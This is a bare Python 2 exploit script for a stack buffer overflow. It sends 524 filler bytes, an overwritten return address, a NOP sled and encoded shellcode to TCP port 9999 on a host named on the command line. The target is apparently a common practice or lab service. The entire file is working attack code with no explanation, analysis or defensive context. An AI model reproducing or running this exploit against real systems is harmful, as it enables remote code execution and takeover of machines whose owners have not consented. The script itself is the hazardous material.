#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

shellcode = ("\xba\x1e\x1f\xe6\xb4\xd9\xc3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\x49\x11\x04\x41\x89\xc5\x4a"
"\xaa\x71\x16\x2b\x22\x94\x27\x6b\x50\xdd\x18\x5b\x12\xb3\x94"
"\x10\x76\x27\x2e\x54\x5f\x48\x87\xd3\xb9\x67\x18\x4f\xf9\xe6"
"\x9a\x92\x2e\xc8\xa3\x5c\x23\x09\xe3\x81\xce\x5b\xbc\xce\x7d"
"\x4b\xc9\x9b\xbd\xe0\x81\x0a\xc6\x15\x51\x2c\xe7\x88\xe9\x77"
"\x27\x2b\x3d\x0c\x6e\x33\x22\x29\x38\xc8\x90\xc5\xbb\x18\xe9"
"\x26\x17\x65\xc5\xd4\x69\xa2\xe2\x06\x1c\xda\x10\xba\x27\x19"
"\x6a\x60\xad\xb9\xcc\xe3\x15\x65\xec\x20\xc3\xee\xe2\x8d\x87"
"\xa8\xe6\x10\x4b\xc3\x13\x98\x6a\x03\x92\xda\x48\x87\xfe\xb9"
"\xf1\x9e\x5a\x6f\x0d\xc0\x04\xd0\xab\x8b\xa9\x05\xc6\xd6\xa5"
"\xea\xeb\xe8\x35\x65\x7b\x9b\x07\x2a\xd7\x33\x24\xa3\xf1\xc4"
"\x4b\x9e\x46\x5a\xb2\x21\xb7\x73\x71\x75\xe7\xeb\x50\xf6\x6c"
"\xeb\x5d\x23\x22\xbb\xf1\x9c\x83\x6b\xb2\x4c\x6c\x61\x3d\xb2"
"\x8c\x8a\x97\xdb\x27\x71\x70\x24\x1f\x72\x0c\xcc\x62\x84\x0d"
"\xb6\xea\x62\x67\xd8\xba\x3d\x10\x41\xe7\xb5\x81\x8e\x3d\xb0"
"\x82\x05\xb2\x45\x4c\xee\xbf\x55\x39\x1e\x8a\x07\xec\x21\x20"
"\x2f\x72\xb3\xaf\xaf\xfd\xa8\x67\xf8\xaa\x1f\x7e\x6c\x47\x39"
"\x28\x92\x9a\xdf\x13\x16\x41\x1c\x9d\x97\x04\x18\xb9\x87\xd0"
"\xa1\x85\xf3\x8c\xf7\x53\xad\x6a\xae\x15\x07\x25\x1d\xfc\xcf"
"\xb0\x6d\x3f\x89\xbc\xbb\xc9\x75\x0c\x12\x8c\x8a\xa1\xf2\x18"
"\xf3\xdf\x62\xe6\x2e\x64\x82\x05\xfa\x91\x2b\x90\x6f\x18\x36"
"\x23\x5a\x5f\x4f\xa0\x6e\x20\xb4\xb8\x1b\x25\xf0\x7e\xf0\x57"
"\x69\xeb\xf6\xc4\x8a\x3e")

junk = "A" * 524

eip = "\xf3\x12\x17\x31"

nop = "\x90" * 8

buffer = junk + eip + nop + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 9999))
s.send(buffer)
s.recv(1024)
s.close()